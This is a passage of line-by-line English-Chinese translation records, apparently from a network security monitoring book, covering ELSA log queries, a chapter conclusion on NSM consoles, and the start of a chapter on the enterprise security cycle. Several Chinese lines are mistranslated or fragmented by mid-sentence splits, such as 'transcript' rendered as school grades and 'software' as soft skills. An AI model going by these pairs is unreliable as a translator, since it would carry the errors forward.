- en: '*Figure 8-20: ELSA query window*'
  id: totrans-0
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 8-20：ELSA 查询窗口*'
- en: To try out a sample query, I set my *From* time to the beginning of the data
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 为了尝试一个示例查询，我将 *From* 时间设置为数据的开始
- en: available using the pop-up calendar, and then enter **www.testmyids.com** in
    the
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 可通过弹出日历进行选择，然后在中输入 **www.testmyids.com**
- en: query box. I click **Submit Query** and see the results shown in Figure 8-21\.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 查询框。我点击 **提交查询** 并看到图 8-21 中显示的结果。
- en: '*Figure 8-21: ELSA search results for* www .testmyids .com'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 8-21：ELSA 对 www.testmyids.com 的搜索结果*'
- en: Notice the program(2) element in the Field Summary section. This indi-
  id: totrans-5
  prefs: []
  type: TYPE_NORMAL
  zh: 请注意“程序(2)”元素出现在字段总结部分。这表明
- en: cates that ELSA identified two sources of data for these results.
  id: totrans-6
  prefs: []
  type: TYPE_NORMAL
  zh: 表示 ELSA 为这些结果识别了两个数据源。
- en: Examining the records, we see the entries of program=bro_http and
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 检查记录时，我们可以看到 program=bro_http 和
- en: program=bro_dns. When there are many different sources of data, we can use
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: program=bro_dns。当有许多不同的数据源时，我们可以使用
- en: this program element to narrow the results. For example, Figure 8-22 shows
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 使用此程序元素来缩小结果。例如，图 8-22 显示
- en: what happens when I enter **192.168.2.127** in the query box, and then click
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 当我在查询框中输入 **192.168.2.127** 后点击时，会发生什么
- en: the program element.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 程序元素的条目。
- en: '*Figure 8-22: ELSA results for 192.168.2.127 grouped by program*'
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 8-22：按程序分组的 192.168.2.127 的 ELSA 结果*'
- en: NSM Consoles **179**
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 控制台 **179**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '![Image 122](index-214_1.png)'
  id: totrans-15
  prefs: []
  type: TYPE_IMG
  zh: '![图 122](index-214_1.png)'
- en: '![Image 123](index-214_2.png)'
  id: totrans-16
  prefs: []
  type: TYPE_IMG
  zh: '![图 123](index-214_2.png)'
- en: You can see that the results are grouped by program, with bro_conn
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以看到结果按程序分组，bro_conn
- en: providing the most results (16,261) and bro_smtp the fewest (2). Clicking
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 提供最多结果的为 bro_conn（16,261 个），最少的为 bro_smtp（2 个）。点击
- en: any Count field starts a new query for just those results. For example, click
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 任何 Count 字段都会开始一个仅针对这些结果的新查询。例如，点击
- en: the **snort** link to see Snort alerts associated with 192.168.2.127, as shown
    in
  id: totrans-20
  prefs: []
  type: TYPE_NORMAL
  zh: '**snort** 链接查看与 192.168.2.127 相关的 Snort 警报，如图中所示'
- en: Figure 8-23\. (ELSA pulls these Snort alerts from the MySQL database.)
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8-23。（ELSA 从 MySQL 数据库中提取这些 Snort 警报。）
- en: '*Figure 8-23: Some of the Snort alerts in ELSA associated with 192.168.2.127*'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 8-23：ELSA 中与 192.168.2.127 相关的部分 Snort 警报*'
- en: Clicking bro_conn displays Bro’s connection logs, a form of session data
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 点击 bro_conn 显示 Bro 的连接日志，这是一种会话数据形式
- en: similar to that of Argus and PRADS, but generated by Bro.
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: 与 Argus 和 PRADS 相似，但由 Bro 生成。
- en: ELSA supports other integrated NSM data as well. For example, to
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: ELSA 还支持其他集成的 NSM 数据。例如，若要
- en: generate a transcript in Snorby (as we did with CapMe in Figure 8-17), click
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 在 Snorby 中生成成绩单（如图 8-17 中我们使用 CapMe 所做的），点击
- en: the **Info** link next to any record, click the **Plugin** drop-down menu, and
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 点击任何记录旁边的 **Info** 链接，点击 **Plugin** 下拉菜单，选择
- en: choose **getPcap**, as shown in Figure 8-24\.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 选择 **getPcap**，如图 8-24 所示。
- en: '*Figure 8-24: Choosing to retrieve full content*'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: '*图 8-24：选择检索完整内容*'
- en: '*data with CapMe in ELSA*'
  id: totrans-30
  prefs: []
  type: TYPE_NORMAL
  zh: '*ELSA 中的 CapMe 数据*'
- en: This option takes you to the CapMe authentication screen, and you
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 此选项将带你进入 CapMe 认证屏幕，你可以
- en: can enter a username and password to retrieve a transcript for the event in
  id: totrans-32
  prefs: []
  type: TYPE_NORMAL
  zh: 可以输入用户名和密码来检索该事件的成绩单
- en: question.
  id: totrans-33
  prefs: []
  type: TYPE_NORMAL
  zh: 问题。
- en: '**180** Chapter 8'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: '**180** 第 8 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: ELSA’s ability to manipulate log data makes for some interesting queries.
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: ELSA 操作日志数据的能力进行一些有趣的查询。
- en: For example, to query for all HTTP POST events that did not involve servers
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 例如，要查询所有未涉及服务器的 HTTP POST 事件
- en: 'in the United States, you could submit the following:'
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 在美国，你可以提交以下内容：
- en: +method:POST -country_code:US
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: +method:POST -country_code:US
- en: Next, group the results by clicking the user_agent element of the Field
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，通过点击字段的 user_agent 元素来对结果进行分组
- en: Summary. A sample of the results from my lab network is shown in Listing 8-3\.
  id: totrans-41
  prefs: []
  type: TYPE_NORMAL
  zh: 摘要。我的实验室网络中结果的示例见于清单 8-3。
- en: 5724 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: 5724 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0
- en: 2314 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
  zh: 2314 Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
- en: 897 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 897 Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML，像
- en: Gecko) Chrome/24.0.1312.57 Safari/537.17
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
  zh: Gecko）Chrome/24.0.1312.57 Safari/537.17
- en: 788 -
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 788 -
- en: '**599 realms/1.0.2 CFNetwork/548.1.4 Darwin/11.0.0** u'
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: '**599 realms/1.0.2 CFNetwork/548.1.4 Darwin/11.0.0** u'
- en: 448 Dalvik/1.4.0 (Linux; U; Android 2.3.4; Kindle Fire Build/GINGERBREAD)
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
  zh: 448 Dalvik/1.4.0 (Linux; U; Android 2.3.4; Kindle Fire Build/GINGERBREAD)
- en: 231 com.apple.Maps/1.0 iPhone OS/6.0.1
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 231 com.apple.Maps/1.0 iPhone OS/6.0.1
- en: '**227 village/1.16.1 CFNetwork/548.1.4 Darwin/11.0.0**'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: '**227 village/1.16.1 CFNetwork/548.1.4 Darwin/11.0.0**'
- en: 129 Shockwave Flash
  id: totrans-51
  prefs: []
  type: TYPE_NORMAL
  zh: 129 Shockwave Flash
- en: '**85 Lost%20World/1.1.0 CFNetwork/548.1.4 Darwin/11.0.0**'
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: '**85 Lost%20World/1.1.0 CFNetwork/548.1.4 Darwin/11.0.0**'
- en: '**76 BejBlitz/600 CFNetwork/609 Darwin/13.0.0**'
  id: totrans-53
  prefs: []
  type: TYPE_NORMAL
  zh: '**76 BejBlitz/600 CFNetwork/609 Darwin/13.0.0**'
- en: '**68 JNPPirateSchool/1.0.6 CFNetwork/548.1.4 Darwin/11.0.0**'
  id: totrans-54
  prefs: []
  type: TYPE_NORMAL
  zh: '**68 JNPPirateSchool/1.0.6 CFNetwork/548.1.4 Darwin/11.0.0**'
- en: 49 Google Update/1.3.21.135;winhttp;cup
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 49 Google Update/1.3.21.135;winhttp;cup
- en: '**48 PetCat/1.4 CFNetwork/548.1.4 Darwin/11.0.0**'
  id: totrans-56
  prefs: []
  type: TYPE_NORMAL
  zh: '**48 PetCat/1.4 CFNetwork/548.1.4 Darwin/11.0.0**'
- en: '**36 Mailroom/1.7.5.1 CFNetwork/609.1.4 Darwin/13.0.0**'
  id: totrans-57
  prefs: []
  type: TYPE_NORMAL
  zh: '**36 Mailroom/1.7.5.1 CFNetwork/609.1.4 Darwin/13.0.0**'
- en: '**35 Paradise%20Cove/3.8 CFNetwork/548.1.4 Darwin/11.0.0**'
  id: totrans-58
  prefs: []
  type: TYPE_NORMAL
  zh: '**35 Paradise%20Cove/3.8 CFNetwork/548.1.4 Darwin/11.0.0**'
- en: 27 Mozilla/5.0 ZMTransaction/1.0
  id: totrans-59
  prefs: []
  type: TYPE_NORMAL
  zh: 27 Mozilla/5.0 ZMTransaction/1.0
- en: 25 GoogleAnalytics/2.0b3 (iPad; U; CPU iPhone OS 5.1.1 like Mac OS X; en-us)
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 25 GoogleAnalytics/2.0b3 (iPad; U; CPU iPhone OS 5.1.1 like Mac OS X; en-us)
- en: '**24 TinyPetsies/1.5.3 CFNetwork/548.1.4 Darwin/11.0.0**'
  id: totrans-61
  prefs: []
  type: TYPE_NORMAL
  zh: '**24 TinyPetsies/1.5.3 CFNetwork/548.1.4 Darwin/11.0.0**'
- en: 17 Storm8/iPhone
  id: totrans-62
  prefs: []
  type: TYPE_NORMAL
  zh: 17 Storm8/iPhone
- en: '*Listing 8-3: ELSA query results for user_agent data*'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: '*Listing 8-3: ELSA 查询结果：user_agent 数据*'
- en: As you can tell from the bolded code, my kids like to play their iPad
  id: totrans-64
  prefs: []
  type: TYPE_NORMAL
  zh: 正如你从加粗的代码中看到的，我的孩子们喜欢玩他们的 iPad
- en: and PC games on a segment monitored by this lab sensor! Each game lists
  id: totrans-65
  prefs: []
  type: TYPE_NORMAL
  zh: 和 PC 游戏在此实验室传感器监控的一个区域内！每个游戏列出
- en: its name as part of the user agent, e.g., **realms** at u, which helps the identification
    process. Beware malicious code masquerading via fake user agents,
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: 其名称作为用户代理的一部分，例如，**realms** 在 u，帮助身份验证过程。警惕通过伪造用户代理来伪装的恶意代码，
- en: however.
  id: totrans-67
  prefs: []
  type: TYPE_NORMAL
  zh: 然而。
- en: Since ELSA has been integrated into SO only recently, analysts are just
  id: totrans-68
  prefs: []
  type: TYPE_NORMAL
  zh: 由于 ELSA 最近才被集成到 SO，分析师们刚刚
- en: beginning to appreciate its power.
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 开始欣赏其强大的功能。
- en: '**conclusion**'
  id: totrans-70
  prefs: []
  type: TYPE_NORMAL
  zh: '**conclusion**'
- en: 'This chapter surveyed the four main open source NSM consoles: Sguil,'
  id: totrans-71
  prefs: []
  type: TYPE_NORMAL
  zh: 本章调查了四个主要的开源 NSM 控制台：Sguil，
- en: Squert, Snorby, and ELSA. These consoles generally do not generate new
  id: totrans-72
  prefs: []
  type: TYPE_NORMAL
  zh: Squert、Snorby 和 ELSA。这些控制台通常不会生成新的
- en: NSM data on their own. Rather, they provide an interface to NSM data sup-
  id: totrans-73
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 数据本身。相反，它们提供一个界面来支持 NSM 数据
- en: plied by other tools. The consoles help analysts review and query for relevant
  id: totrans-74
  prefs: []
  type: TYPE_NORMAL
  zh: 被其他工具提供的功能。控制台帮助分析师审查和查询相关的
- en: information, and then pivot to related data in an efficient manner.
  id: totrans-75
  prefs: []
  type: TYPE_NORMAL
  zh: 信息，然后以高效的方式转向相关数据。
- en: NSM Consoles **181**
  id: totrans-76
  prefs: []
  type: TYPE_NORMAL
  zh: NSM 控制台 **181**
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-77
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Sguil is the original NSM console, and many consider it to be the reference
    NSM platform. Its six main features are the core capabilities analysts
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: Sguil 是原始的 NSM 控制台，许多人认为它是参考 NSM 平台。其六个主要功能是分析师的核心能力
- en: need when doing NSM operations. Sguil lacks some of the flexibility found
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 在进行 NSM 操作时需要的工具。Sguil 缺乏一些在其他工具中发现的灵活性
- en: in new applications, however. Tools like Squert, Snorby, and ELSA are web-
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: 然而，在新的应用中。像 Squert、Snorby 和 ELSA 这样的工具是基于 Web 的
- en: accessible. Snorby even offers an app for the iOS platform. ELSA incorpo-
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 便捷的访问。Snorby 甚至为 iOS 平台提供了一个应用。ELSA 集成了
- en: rates a much richer set of NSM data, although analysts continue to extend
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: 评估更丰富的 NSM 数据集，尽管分析师们继续扩展
- en: the capabilities of Sguil to accept data from non-network sources such as
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: Sguil 的功能可以接受来自非网络源的数据，如
- en: OSSEC.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: OSSEC。
- en: By getting a sense of the interface and capabilities of each tool, as well
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 通过了解每个工具的界面和功能，作为补充
- en: as the primary forms of data they manipulate, you can begin to imagine the
  id: totrans-86
  prefs: []
  type: TYPE_NORMAL
  zh: 作为他们操作的主要数据形式，你可以开始想象
- en: sorts of detection and response operations one can conduct with this rich
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 通过这种丰富的数据进行的检测和响应操作类型
- en: data on hand. Choose the tool that best suits your operational needs. In the
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 数据在手时。选择最适合你操作需求的工具。在
- en: next chapter I will outline ways to put NSM to work in your environment by
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 下一章我将概述如何在你的环境中使用 NSM
- en: describing NSM operations.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 描述 NSM 操作时。
- en: '**182** Chapter 8'
  id: totrans-91
  prefs: []
  type: TYPE_NORMAL
  zh: '**182** 第 8 章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Part IV**'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '**Part IV**'
- en: '**N S M i N a c T i o N**'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: '**N S M i N a c T i o N**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**9**'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: '**9**'
- en: '**N S M o P e r aT i o N S**'
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: '**N S M o P e r aT i o N S**'
- en: Analysts need tools to find intruders, but
  id: totrans-99
  prefs: []
  type: TYPE_NORMAL
  zh: 分析师需要工具来找到入侵者，但
- en: methodology is more important than soft-
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 方法论比软性技能更为重要
- en: ware. Tools collect and interpret data, but
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
  zh: 软件。工具收集并解释数据，但
- en: methodology provides the conceptual model.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 方法论提供了概念模型。
- en: Analysts must understand how to use tools to achieve
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 分析师必须了解如何使用工具来实现
- en: a particular goal, but it’s important to start with a good
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 一个特定的目标，但重要的是要从一个好的开始
- en: operational model, and then select tools to provide
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: 操作模型，然后选择提供
- en: data supporting that model.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 支持该模型的数据。
- en: Too many security organizations put tools before operations. They think
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 太多的安全组织将工具置于操作之前。他们认为
- en: “we need to buy a log management system” or “I will assign one analyst
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: “我们需要购买一个日志管理系统”或“我将指派一个分析员”
- en: to antivirus duty, one to data leakage protection duty,” and so on. A tool-
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 执行反病毒任务，一个负责数据泄漏保护的任务，”等等。一个工具—
- en: driven team will not be effective as a mission-driven team. When the mis-
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
  zh: 由驱动的团队将不会像一个使命驱动的团队那样有效。当任务—
- en: sion is defined by running software, analysts become captive to the features
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
  zh: 使命通过运行软件来定义，分析员变得依赖于功能
- en: and limitations of their tools. Analysts who think in terms of what they need
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
  zh: 和工具的限制。分析员如果仅仅考虑他们需要的工具，
- en: in order to accomplish their mission will seek tools to meet those needs,
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
  zh: 为了完成使命，团队将寻求满足这些需求的工具，
- en: and keep looking if their requirements aren’t met. Sometimes they even
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
  zh: 如果他们的要求未得到满足，就继续寻找。有时他们甚至
- en: decide to build their own tools.
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
  zh: 决定构建他们自己的工具。
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: This chapter provides a foundation for developing an NSM operational model that
    will work for your organization. We’ll start with an overview of
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: 本章为开发适合您组织的NSM操作模型提供了基础。我们将从
- en: the enterprise security cycle.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: 企业安全周期。
- en: '**The enterprise Security cycle**'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: '**企业安全周期**'
- en: This book advocates NSM as an effective operational model. I define NSM
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 本书提倡NSM作为一种有效的操作模型。我将NSM定义为
- en: as the collection, analysis, and escalation of indications and warnings to
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
  zh: 如收集、分析和升级指示和警告以
- en: detect and respond to intrusions. This approach doesn’t explicitly address
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 检测和响应入侵。这种方法并没有明确地解决
- en: planning activities or trying to resist intrusions. All four phases of the secu-
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
  zh: 在规划活动或试图抵抗入侵时，安全周期的四个阶段都在进行。
- en: rity cycle—planning, resistance, detection, and response—are necessary
  id: totrans-124
  prefs: []
  type: TYPE_NORMAL
  zh: 安全周期——规划、抵抗、发现和响应——是必要的
- en: when protecting an organization from threats. Therefore, the first step in
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
  zh: 在保护组织免受威胁时。因此，抵抗入侵的第一步
- en: building an operational model is to describe the relationships among plan-
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
  zh: 构建操作模型的目标是描述规划之间的关系—
- en: ning, resistance, detection, and response, as shown in Figure 9-1 (a repro-
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
  zh: 持续检测、抵抗、发现和响应，如图9-1所示（一个再版图示）
- en: duction of Figure 1-1).1
  id: totrans-128
  prefs: []
  type: TYPE_NORMAL
  zh: 图1-1的再版生产）。1
- en: IT mainly responsible, security assists
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
  zh: IT主要负责，安全协助
- en: Plan
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
  zh: 规划
- en: Resist
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
  zh: 抵抗
- en: Prepare
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
  zh: 准备
- en: Filter
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
  zh: 过滤
- en: Assess
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
  zh: 评估
- en: Protect
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
  zh: 保护
- en: Resolve
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
  zh: 解决
- en: Escalate
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
  zh: 升级
- en: Collect
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
  zh: 收集
- en: Analyze
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
  zh: 分析
- en: Respond
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
  zh: 响应
- en: Detect
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
  zh: 检测
- en: Security mainly responsible, IT assists
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
  zh: 安全主要负责，IT协助
- en: '*Figure 9-1: Enterprise security cycle*'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
  zh: '*图9-1：企业安全周期*'
- en: Figure 9-1 shows the relationships among the four core security activi-
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
  zh: 图9-1显示了四个核心安全活动之间的关系—
- en: ties. Although it depicts a smooth progression from one phase to the next,
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
  zh: 问题。尽管它描绘了从一个阶段到下一个阶段的顺利过渡，
- en: in the real world, all four activities occur simultaneously because organiza-
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: 在现实世界中，这四项活动是同时进行的，因为组织—
- en: tions often experience different intrusion states at once. IT and security
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: 在同一时刻，IT和安全
- en: teams plan new defenses while existing countermeasures repel some intrud-
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 团队在规划新的防御措施时，现有的对策已经在抵御一些入侵者—
- en: ers. While working to detect one set of intruders, CIRTs are responding to
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 团队在努力检测一组入侵者时，CIRT团队正在响应
- en: other intruders already in the organization.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
  zh: 其他已在组织中的入侵者。
- en: 1\. Elements of this cycle appeared in my 2010 presentation to SANS titled “CIRT-Level
    Response to Advanced Persistent Threat” *(http://computer-forensics.sans.org/summit-archives/*
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 1. 本循环的元素出现在我2010年对SANS的演讲中，标题为“CIRT级别对抗高级持续性威胁的响应” *(http://computer-forensics.sans.org/summit-archives/*
- en: '*2010/31-bejtlich-cirt-level-response.pdf)*.'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: '*2010/31-bejtlich-cirt-level-response.pdf)*。'
- en: '**186** Chapter 9'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: '**186** 第9章'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '***The Planning Phase***'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: '***规划阶段***'
- en: The goal of the planning phase is to position the organization as effectively
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
  zh: 规划阶段的目标是让组织在最有效的方式中定位自己
- en: as possible to resist intrusions, or to counter weaknesses being exploited
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
  zh: 尽可能地抵抗入侵，或反制正在被利用的弱点
- en: by ongoing intruder activity. In this phase, IT and security teams prepare
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 通过持续的入侵者活动。在此阶段，IT和安全团队准备
- en: and assess the situation. They enable defense and evaluate its effectiveness.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: 并评估情况。它们使防御成为可能并评估其效果。
- en: Budgeting, auditing, compliance checks, training, secure software develop-
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: 预算、审计、合规检查、培训、安全软件开发—
- en: ment, and similar work occupy this phase. Adversary simulation, penetra-
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 管理和类似工作占据了这一阶段。对抗者模拟，渗透测试—
- en: tion testing, and red teaming are examples of assessment work.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 测试和红队行动是评估工作的示例。
- en: '**N o T e** *The*'
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
  zh: '**注释** *The*'
- en: Red Team Journal *defines* red teaming *as “the practice of viewing a problem*
    *from an adversary or competitor’s perspective”* (http://redteamjournal.com/
  id: totrans-164
  prefs: []
  type: TYPE_NORMAL
  zh: 红队期刊 *定义* 红队行动 *为“从对手或竞争者的角度看问题的实践”* (http://redteamjournal.com/
- en: about/red-teaming-and-alternative-analysis/) *. In practice, this means engaging*
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 关于/red-teaming-and-alternative-analysis/) *。在实际操作中，这意味着参与*
- en: '*one or more security professionals to conduct offensive operations against
    an organization in order to assess security measures. Adversary simulation is
    a form of red* *teaming where the operators seek to emulate the tools, techniques,
    and procedures of* *a selected threat group.* Penetration testing *is sometimes
    used as a synonym for red* *teaming, although some consider penetration testing
    to be a technique used by the red* *team to achieve its overall goal.*'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: '*一个或多个安全专家被聘请来对一个组织进行进攻性操作，以评估安全措施。对抗者模拟是一种红队* *行动的形式，其中操作者试图模仿* *一个选定威胁组的工具、技术和程序。*
    渗透测试 *有时被用作红队* *行动的同义词，尽管一些人认为渗透测试是红队用来实现整体目标的技术。*'
- en: '***The Resistance Phase***'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: '***抵抗阶段***'
- en: During the resistance phase, IT and security teams filter and protect.
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 在抵抗阶段，IT和安全团队过滤和保护。
- en: Automated countermeasures such as firewalls, antivirus, data-leakage pro-
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 自动化对策，如防火墙、杀毒软件、数据泄漏防护等，
- en: tection, whitelisting, and related technologies designed to stop intruders
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 检测、白名单和相关技术，旨在阻止入侵者
- en: before they can gain unauthorized access to a network are parts of this
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 在他们能够未经授权访问网络之前的部分
- en: phase.
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 阶段。
- en: Security awareness training and configuration and vulnerability
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 安全意识培训以及配置和漏洞修复
- en: management are other countermeasures designed to harden the human
  id: totrans-174
  prefs: []
